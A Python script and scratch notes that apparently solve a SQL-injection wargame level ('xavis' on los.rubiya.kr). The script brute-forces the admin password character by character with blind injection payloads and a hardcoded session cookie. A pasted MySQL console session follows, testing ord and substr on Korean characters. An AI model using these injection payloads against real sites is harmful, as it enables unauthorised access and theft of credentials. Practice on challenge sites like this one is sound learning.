#-*- coding: utf-8 -*-
import http
import http.client
import http.server
import http.cookies
import urllib
import urllib.request
import urllib.response
import urllib.parse
import urllib.error
#헥스로 바꿀수 있겠다야
#char 는 아스키코드값, 0xhex값
#ord 는 문자를 주면  무조건 맨 왼쪽의 코드값으로 준다. 여기서 문자는 0xhex로 전달가능
# ex) 는 시발 개뿔
pw=[]
for i in range(1,11):
	for j in range(150,260):
		#url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27%20||%20id=%27admin%27%20%26%26%20substr(pw,{0},1)%20%20%3C%20char({1})%20%23".format(i,j)
		#url='http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=asdf&no=1 or id LIKE "admin" %26%26 left(pw,{0}) LIKE "{password}{ascii}"'.format(i,password=pw,ascii=arr[j])
		url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=%27%20||%20id=%27admin%27%20%26%26%20ord(substr(pw,{0},1))%20=%20{1}%20%23".format(i,j)
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=ao37vomfnh3qatk6n7htaq1hg2")
		print(url)
		data = urllib.request.urlopen(r).read().decode("utf-8")
		if data.find("Hello admin") != -1 :
			pw.append(j)
			print("Password : {0}".format(j))
			break
print(pw)
'''
#160,180,180,161,180,180,180,161,161,161 //d이거아님
'''
#184,249,197,167,198,208,196,161,164,187
#print()
#s=chr(184)+""+chr(249)+""+chr(197)+""+chr(167)+""+chr(198)+""+chr(208)+""+chr(196)+""+chr(161)+""+chr(164)+""+chr(187)
#print()

# https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=%27%20||%20id=%27admin%27%20%26%26%20ord(substr(%27%EC%9A%B0%EC%99%95%EA%B5%B3%27,1,1))%20=%2050864%20%23
# query : select id from prob_xavis where id='admin' and pw='' || id='admin' && ord(substr('우왕굳',1,1)) = 50864 #'


7134.472]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Owner>cd \

C:\>cd aut
지정된 경로를 찾을 수 없습니다.

C:\>cd Server

C:\Server>ls
'ls'은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는
배치 파일이 아닙니다.

C:\Server>dir
 C 드라이브의 볼륨에는 이름이 없습니다.
 볼륨 일련 번호: 8A67-0F10

 C:\Server 디렉터리

2018-03-12  오전 12:36    <DIR>          .
2018-03-12  오전 12:36    <DIR>          ..
2015-08-01  오전 01:32           987,136 AutoSet.exe
2018-09-01  오후 08:35             1,525 AutoSet.ini
2018-03-12  오전 12:36                49 AutoSet.url
2014-04-05  오후 04:59            53,248 AutoSetBackup.exe
2018-03-12  오전 12:36                60 AutoSetCafe.url
2018-03-12  오전 12:36                57 AutoSetFacebook.url
2018-10-07  오후 05:14    <DIR>          public_html
2018-03-12  오전 12:36    <DIR>          server
2018-03-12  오전 12:35    <DIR>          solution
2018-03-12  오전 12:36           436,966 unins000.dat
2018-03-12  오전 12:35         1,195,041 unins000.exe
2014-04-05  오후 04:57         4,286,744 vc2005_vcredist_x64.exe
2014-04-05  오후 04:57         2,373,640 vc2008_vcredist_x64.exe
2014-04-05  오후 04:57         5,718,872 vc2010_vcredist_x64.exe
2014-04-05  오후 04:57         7,191,808 vc2012_vcredist_x64.exe
              12개 파일          22,245,146 바이트
               5개 디렉터리  77,861,957,632 바이트 남음

C:\Server>cd server

C:\Server\server>dir
 C 드라이브의 볼륨에는 이름이 없습니다.
 볼륨 일련 번호: 8A67-0F10

 C:\Server\server 디렉터리

2018-03-12  오전 12:36    <DIR>          .
2018-03-12  오전 12:36    <DIR>          ..
2018-03-12  오전 12:35    <DIR>          autoset
2018-03-12  오전 12:36    <DIR>          bin
2018-03-12  오전 12:36    <DIR>          conf
2018-03-12  오전 12:36    <DIR>          error
2018-03-12  오전 12:36    <DIR>          icons
2018-12-29  오후 05:01    <DIR>          logs
2018-03-12  오전 12:36    <DIR>          modules
2018-03-12  오전 12:36    <DIR>          MySQL5
2018-03-12  오전 12:36    <DIR>          sendmail
2018-10-10  오전 06:16    <DIR>          temp
               0개 파일                   0 바이트
              12개 디렉터리  77,861,953,536 바이트 남음

C:\Server\server>cd MySQL5

C:\Server\server\MySQL5>dir
 C 드라이브의 볼륨에는 이름이 없습니다.
 볼륨 일련 번호: 8A67-0F10

 C:\Server\server\MySQL5 디렉터리

2018-03-12  오전 12:36    <DIR>          .
2018-03-12  오전 12:36    <DIR>          ..
2018-03-12  오전 12:36    <DIR>          bin
2015-08-01  오전 02:25            17,987 COPYING
2018-12-29  오후 05:01    <DIR>          data
2015-08-01  오전 02:25             1,141 my-default.ini
2018-03-12  오전 12:36               878 my.ini
2015-08-01  오전 02:26             2,496 README
2018-03-12  오전 12:36    <DIR>          scripts
2018-03-12  오전 12:36    <DIR>          share
               4개 파일              22,502 바이트
               6개 디렉터리  77,861,953,536 바이트 남음

C:\Server\server\MySQL5>cd bin

C:\Server\server\MySQL5\bin>mysql.exe -uroot -p
Enter password: *******
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1
Server version: 5.6.20 MySQL Community Server (GPL)

Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select ord("rk")
    -> ;
+-----------+
| ord("rk") |
+-----------+
|       114 |
+-----------+
1 row in set (0.01 sec)

mysql> select ord("가");
+------------+
| ord("가")  |
+------------+
|   15380608 |
+------------+
1 row in set (0.00 sec)

mysql> select char(50864);
+-------------+
| char(50864) |
+-------------+
| ư           |
+-------------+
1 row in set (0.00 sec)

mysql> select char(50868);
+-------------+
| char(50868) |
+-------------+
| ƴ           |
+-------------+
1 row in set (0.00 sec)

mysql> select ord('가');
+------------+
| ord('가')  |
+------------+
|   15380608 |
+------------+
1 row in set (0.00 sec)

mysql> select char(15380608);
+----------------+
| char(15380608) |
+----------------+
| 가             |
+----------------+
1 row in set (0.00 sec)

mysql> select substr('가나다라',1,1);
+----------------------------+
| substr('가나다라',1,1)     |
+----------------------------+
| 가                         |
+----------------------------+
1 row in set (0.01 sec)

mysql> select substr('가나다라',2,1);
+----------------------------+
| substr('가나다라',2,1)     |
+----------------------------+
| 나                         |
+----------------------------+
1 row in set (0.00 sec)

mysql> select ord('빽');
+------------+
| ord('빽')  |
+------------+
|   15448509 |
+------------+
1 row in set (0.00 sec)

mysql> select ord(substr('가나다라',1,1));
+---------------------------------+
| ord(substr('가나다라',1,1))     |
+---------------------------------+
|                        15380608 |
+---------------------------------+
1 row in set (0.00 sec)

mysql> select ord(substr('가나다라',2,1));
+---------------------------------+
| ord(substr('가나다라',2,1))     |
+---------------------------------+
|                        15434392 |
+---------------------------------+
1 row in set (0.00 sec)

mysql> select ord('우');
+------------+
| ord('우')  |
+------------+
|   15506096 |
+------------+
1 row in set (0.00 sec)

mysql> ㅂ
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ㅂ' at line 1
mysql> quit
Bye

C:\Server\server\MySQL5\bin>